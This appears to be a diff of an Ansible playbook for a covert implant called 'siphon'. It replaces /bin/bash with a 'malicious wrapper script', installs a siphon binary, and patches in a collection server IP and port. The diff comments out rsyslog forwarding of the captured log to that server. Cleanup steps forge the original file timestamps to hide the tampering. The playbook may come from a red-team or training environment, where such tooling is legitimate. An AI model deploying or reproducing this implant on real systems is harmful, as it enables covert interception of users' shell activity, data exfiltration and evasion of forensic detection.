@@ -2,25 +2,20 @@
 #- name: Gather system facts. Needed for OS architecture
 #  ansible.builtin.setup:
 
-- name: Define variables for paths and filenames
-  set_fact:
-    file_to_replace: "/bin/bash"
-    file_new_path: "/bin/ash"
-    siphon_path: "/bin/siphon0"
-    logfile_path: "/output"
-    server_ip: "192.168.1.1"
-    server_port: "80"
+# Set in group vars
+#- name: Define variables for paths and filenames
+#  set_fact:
 
-- name: Get original timestamps of {{ file_to_replace }}
-  command: stat -c "%y %z" {{ file_to_replace }}
+- name: Get original timestamps of {{ siphon_file_old_path }}
+  command: stat -c "%y %z" {{ siphon_file_old_path }}
   register: bash_timestamps
   changed_when: false
 
 # TODO: prepend with . to hide 
-- name: Move {{ file_to_replace }} to {{ file_new_path }}
-  command: mv {{ file_to_replace }} {{ file_new_path }}
+- name: Move {{ siphon_file_old_path }} to {{ siphon_file_new_path }}
+  command: mv {{ siphon_file_old_path }} {{ siphon_file_new_path }}
   args:
-    creates: "{{ file_new_path }}"
+    creates: "{{ siphon_file_new_path }}"
 
 - name: Copy siphon based on architecture
   copy:
@@ -35,78 +30,77 @@
   debug:
     msg: "Selected siphon version: files/siphon-linux-{{ ansible_architecture }}"
 
-- name: Copy malicious wrapper script to {{ file_to_replace }}
+- name: Copy malicious wrapper script to {{ siphon_file_old_path }}
   copy:
     src: files/bash_wrapper.sh
-    dest: "{{ file_to_replace }}"
+    dest: "{{ siphon_file_old_path }}"
     owner: root
     group: root
     mode: '0755'
 
 - name: Replace bash path in the script
   ansible.builtin.replace:
-    path: "{{ file_to_replace }}"
+    path: "{{ siphon_file_old_path }}"
     regexp: '/bin/ash'
-    replace: '{{ file_new_path }}'
+    replace: '{{ siphon_file_new_path }}'
 
 - name: Replace siphon path in the script
   ansible.builtin.replace:
-    path: "{{ file_to_replace }}"
+    path: "{{ siphon_file_old_path }}"
     regexp: '/bin/siphon0'
     replace: '{{ siphon_path  }}'
 
-- name: Replace server IP and port in the script
+- name: Replace server IP in the script
   ansible.builtin.replace:
-    path: "{{ file_to_replace }}"
+    path: "{{ siphon_file_old_path }}"
     regexp: 'SERVER_IP'
-    replace: '{{ server_ip }}'
+    replace: '{{ siphon_server_ip }}'
 
-- name: Replace server IP and port in the script
+- name: Replace server port in the script
   ansible.builtin.replace:
-    path: "{{ file_to_replace }}"
+    path: "{{ siphon_file_old_path }}"
     regexp: 'PORT'
-    replace: '{{ server_port }}'
+    replace: '{{ siphon_server_port }}'
 
 - name: Replace logfile location in the script
   ansible.builtin.replace:
-    path: "{{ file_to_replace }}"
+    path: "{{ siphon_file_old_path }}"
     regexp: '/outputfile'
-    replace: '{{ logfile_path }}'
-
+    replace: '{{ siphon_logfile_path }}'
 
 # RSYSLOG CONFIG
 # TODO - firewall?
-- name: Install rsyslog
-  ansible.builtin.apt:
-    name: rsyslog
-    state: present
+#- name: Install rsyslog
+#  ansible.builtin.apt:
+#    name: rsyslog
+#    state: present
 
-- name: Ensure rsyslog service is running
-  ansible.builtin.service:
-    name: rsyslog
-    state: started
-    enabled: yes
+#- name: Ensure rsyslog service is running
+#  ansible.builtin.service:
+#    name: rsyslog
+#    state: started
+#    enabled: yes
 
-- name: Configure rsyslog to send logfile to Graylog
-  ansible.builtin.copy:
-    dest: /etc/rsyslog.d/01-glogging.conf
-    content: |
-      input(type="imfile"
-            File="{{ logfile_path }}"
-            Tag="custom_log"
-            Severity="info"
-            Facility="local7")
+#- name: Configure rsyslog to send logfile to Graylog
+#  ansible.builtin.copy:
+#    dest: /etc/rsyslog.d/01-glogging.conf
+#    content: |
+#      input(type="imfile"
+#            File="{{ siphon_logfile_path }}"
+#            Tag="custom_log"
+#            Severity="info"
+#            Facility="local7")
+#
+#      # Output: Forward logs to Graylog server
+#      *.* @{{ siphon_server_ip }}:{{ siphon_server_port }}
+#    owner: root
+#    group: root
+#    mode: '0644'
 
-      # Output: Forward logs to Graylog server
-      *.* @{{ server_ip }}:{{ server_port }}
-    owner: root
-    group: root
-    mode: '0644'
-
-- name: Restart rsyslog
-  ansible.builtin.service:
-    name: rsyslog
-    state: restarted
+#- name: Restart rsyslog
+#  ansible.builtin.service:
+#    name: rsyslog
+#    state: restarted
 
 # Verify config
 # journalctl -f -u rsyslog
@@ -114,11 +108,11 @@
 # Cleanup
 - name: Apply original timestamps to wrapper
   command: >
-    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ file_new_path }}
+    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ siphon_file_new_path }}
 
-- name: Apply original timestamps to new {{ file_to_replace }}
+- name: Apply original timestamps to new {{ siphon_file_old_path }}
   command: >
-    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ file_to_replace }}
+    touch -d "{{ bash_timestamps.stdout_lines[0] }}" {{ siphon_file_old_path }}
 
 - name: Apply original timestamps to siphon
   command: >
